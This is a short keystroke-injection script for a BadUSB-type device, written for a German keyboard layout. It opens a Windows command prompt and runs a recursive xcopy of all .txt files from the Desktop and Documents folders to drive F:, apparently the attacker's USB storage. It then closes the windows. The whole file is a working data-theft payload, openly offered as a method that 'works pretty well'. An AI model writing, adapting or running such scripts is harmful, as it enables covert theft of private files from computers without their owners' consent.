//Layout on this script is DE so you will probably have to change some things
//Also this is not the most advanced method of doing this but it kinda works pretty well
//ALT GR + 7 = ` = *
//ALT GR + V = @ = \
layout("de");

typingSpeed(30,0);
press("GUI r");
delay(100);
type("cmd");
delay(100);
press("Enter");
delay(500);

typingSpeed(0,0);

type("cd Desktop");
press("Enter");
delay(200);

type("xcopy /S `");
press("BACKSPACE");
type(".txt f:");
press("Enter");

/////////////documents/////////////

typingSpeed(30,0);
press("GUI r");
delay(100);
type("cmd");
delay(100);
press("Enter");
delay(500);

typingSpeed(10,0);

press("Enter");
type("cd Documents");
press("Enter");
delay(100);

type("xcopy /S `");
press("BACKSPACE");
type(".txt f:");
press("Enter");

delay(20000);
press("CTRL c");
delay(200);
type("exit");
press("Enter");

delay(200);
press("CTRL c");
delay(200);
type("exit");
press("Enter");
